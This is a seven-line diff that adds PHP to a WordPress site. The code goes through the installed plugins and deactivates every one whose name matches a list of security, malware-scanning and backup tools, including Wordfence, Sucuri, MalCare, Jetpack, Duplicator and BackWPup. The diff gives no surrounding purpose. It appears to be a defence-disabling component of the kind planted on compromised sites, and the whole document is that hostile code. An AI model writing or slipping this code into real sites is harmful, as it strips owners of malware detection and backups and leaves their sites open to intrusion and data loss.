@@ -1,0 +1,7 @@
+$plugins = get_plugins();
+foreach ($plugins as $filename => $data) {
+	$bad_names = '/wordfence|sucuri|security|malcare|defender|jetpack|malware|wp\-cerber|gotmls|secupress|antivirus|backup|wp\-staging|backwpup|wp\-migration|duplicator/i';
+	if (preg_match($bad_names, $filename)) {
+		deactivate_plugins($filename);
+	}
+}
